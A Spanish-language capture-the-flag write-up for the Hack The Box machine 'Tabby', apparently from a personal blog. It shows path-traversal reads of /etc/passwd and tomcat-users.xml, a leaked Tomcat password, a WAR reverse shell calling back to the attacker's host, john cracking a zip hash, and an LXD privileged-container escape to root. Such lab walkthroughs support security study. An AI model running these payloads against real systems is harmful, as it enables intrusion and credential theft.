---
tags:
title: Tabby - Easy (HTB)
permalink: /Tabby-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
 nmap -sCV -p22,80,8080 10.129.250.163                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-14 22:32 -03
Nmap scan report for 10.129.250.163
Host is up (0.94s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.72 seconds
```

## Website / Port 80

La pagina principal es la siguiente.

![image-center](/assets/images/{10873445-050F-4860-B3DE-47E862F01AA7}.png)

### Gobuster fuzzing

```bash
gobuster dir -u http://tabby.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tabby.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 306] [--> http://tabby.htb/files/]
/assets               (Status: 301) [Size: 307] [--> http://tabby.htb/assets/]
```

Nada interesante ya que me devuelve un codigo de estado `403` al visitar esa ruta.

En la pagina principal al ahcer clock en el boton `news` nos redirige al siguiente enlace, con un mensaje particular.

![image-center](/assets/images/{AED05D9A-7861-4D5F-86ED-FBC35AF72020}.png)

Sin embargo, veo que al parecer lo que vemos el contenido de algun archivo, ya que por parametro `file` hay un archivo `statement` declarado, por lo que podria intentar con `Path Traversal` intentar ver el `/etc/passwd`.

```bash
curl -s -X GET 'http://megahosting.htb/news.php?file=../../../../../../../etc/passwd'       
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Como veo que puedo ver archivos del sistema, puedo empezar a enumerar.

```bash
curl -s -X GET 'http://megahosting.htb/news.php?file=../../../../../../../etc/tomcat9/Catalina/localhost/manager.xml'
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<Context path="/manager" 
        docBase="/usr/share/tomcat9-admin/manager"
        antiResourceLocking="false" privileged="true" />
```

## Website / Port 8080 

Veo que en el puerto `8080` corre tomcat, y ademas es algo que ya sabia debido a la filtracion del `/etc/passwd` donde se ve el usuario tomcat, en la misma pagina nos indica la ruta del archivo `tomctt-users.xml` el cual muchas veces contiene credenciales de usuario.

![image-center](/assets/images/{D4530CCF-DFC6-4FC7-9851-61DBFB10A8AC}.png)

Puedo usar el `LFI`, para poder ver el contenido del archivo.

```bash
 curl -s -X GET 'http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml'     
<?xml version="1.0" encoding="UTF-8"?>
[..snip..]
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>

```

![image-center](/assets/images/{2F557FA7-320A-41E3-8558-98A8A5ECB008}.png)

```bash
./warsend.sh 10.10.17.19 7777 10.129.250.163 8080 tomcat '$3cureP4s5w0rd123!' revshell

 _       _____    ____  _____                __                                                                                                                                            
| |     / /   |  / __ \/ ___/___  ____  ____/ /                                                                                                                                            
| | /| / / /| | / /_/ /\__ \/ _ \/ __ \/ __  /                                                                                                                                             
| |/ |/ / ___ |/ _, _/___/ /  __/ / / / /_/ /                                                                                                                                              
|__/|__/_/  |_/_/ |_|/____/\___/_/ /_/\__,_/                                                                                                                                               
                                                                                                                                                                                           
[>] Created By : thewhiteh4t
[>] Version    : 1.0.0

[+] LHOST                  : 10.10.17.19
[+] LPORT                  : 7777
[+] RHOST                  : 10.129.250.163
[+] RPORT                  : 8080
[+] Username               : tomcat
[+] Password               : $3cureP4s5w0rd123!
[+] Reverse Shell Filename : revshell
[+] Payload                : java/jsp_shell_reverse_tcp

[!] Checking Dependencies...                                                                                                                                                               

[!] Testing Tomcat Manager Text API Access...                                                                                                                                              
                                                                                                                                                                                           
[+] Login Successful!
                                                                                                                                                                                           
[+] Generating WAR Reverse Shell...
Payload size: 1098 bytes
Final size of war file: 1098 bytes

[!] Uploading WAR File...
OK - Deployed application at context path [/revshell]

[!] Triggering Reverse Shell...                                                                                                                                                            
                                                                                                                                                                                           
[+] Starting Listener...
listening on [any] 7777 ...
connect to [10.10.17.19] from tabby.htb [10.129.250.163] 37522
script /dev/null -c bash 
Script started, file is /dev/null
tomcat@tabby:/var/lib/tomcat9$ ^Z
zsh: suspended  ./warsend.sh 10.10.17.19 7777 10.129.250.163 8080 tomcat '$3cureP4s5w0rd123!'
```


```bash
tomcat@tabby:/var/www/html$ ls
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt
tomcat@tabby:/var/www/html$ cd files/
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
```


```bash
 zip2john proof.zip > hash
ver 1.0 proof.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 proof.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 proof.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 proof.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** proof.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 proof.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 proof.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/zsln/htb/tabby/warsend]
└─# ls    
hash  proof.zip  README.md  revshell.war  revwar.py  var  warsend.sh  zs1n.war
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/zsln/htb/tabby/warsend]
└─# cat hash       
proof.zip:$pkzip$5*1*1*0*8*24*7db5*dd84cfff4c26e855919708e34b3a32adc4d5c1a0f2a24b1e59be93f3641b254fde4da84c*1*0*8*24*6a8b*32010e3d24c744ea56561bbf91c0d4e22f9a300fcf01562f6fcf5c986924e5a6f6138334*1*0*0*24*5d46*ccf7b799809a3d3c12abb83063af3c6dd538521379c8d744cd195945926884341a9c4f74*1*0*8*24*5935*f422c178c96c8537b1297ae19ab6b91f497252d0a4efe86b3264ee48b099ed6dd54811ff*2*0*72*7b*5c67f19e*1b1f*4f*8*72*5a7a*ca5fafc4738500a9b5a41c17d7ee193634e3f8e483b6795e898581d0fe5198d16fe5332ea7d4a299e95ebfff6b9f955427563773b68eaee312d2bb841eecd6b9cc70a7597226c7a8724b0fcd43e4d0183f0ad47c14bf0268c1113ff57e11fc2e74d72a8d30f3590adc3393dddac6dcb11bfd*$/pkzip$::proof.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:proof.zip
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/zsln/htb/tabby/warsend]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (proof.zip)     
1g 0:00:00:00 DONE (2025-11-15 01:39) 1.149g/s 11911Kp/s 11911Kc/s 11911KC/s adornadis..adhi1411
Use the "--show" op
```

```bash
ash@tabby:/var/www/html/files$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:/var/www/html/files$ cat /home/ash/user.txt 
321b712648069cdcd07294fe455097cf
```

```bash
ash@tabby:~$ /snap/bin/lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias rooted
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
```

```bash
ash@tabby:~$ /snap/bin/lxc init rooted rootcontainer -c security.privileged=true
Creating privesc
Error: No storage pool found. Please create a new storage pool
ash@tabby:~$ /snap/bin/lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: yes
What IP address or DNS name should be used to reach this node? [default=10.129.250.163]: ^C
ash@tabby:~$ /snap/bin/lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: no
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
Name of the new storage pool [default=default]: default
Name of the storage backend to use (lvm, zfs, ceph, btrfs, dir) [default=zfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
Would you like to create a new local network bridge? (yes/no) [default=yes]: yes
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: auto
Would you like the LXD server to be available over the network? (yes/no) [default=no]: no
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] yes
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: no
ash@tabby:~$ /snap/bin/lxc init zs1n privesc -c security.privileged=true
Creating privesc
```

```bash
ash@tabby:~$ /snap/bin/lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias rooted
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
ash@tabby:~$ /snap/bin/lxc init rooted rootcontainer -c security.privileged=true
Creating rootcontainer
ash@tabby:~$ /snap/bin/lxc config device add rootcontainer rootdevice disk source=/ path=/mnt/root recursive=true
Device rootdevice added to rootcontainer
ash@tabby:~$ /snap/bin/lxc start rootcontainer
ash@tabby:~$ /snap/bin/lxc exec rootcontainer /bin/sh
~ # whoami
root
```

```bash
/mnt/root/root # cat root.txt 
c139473666309a926f7f345af3c8575b
```
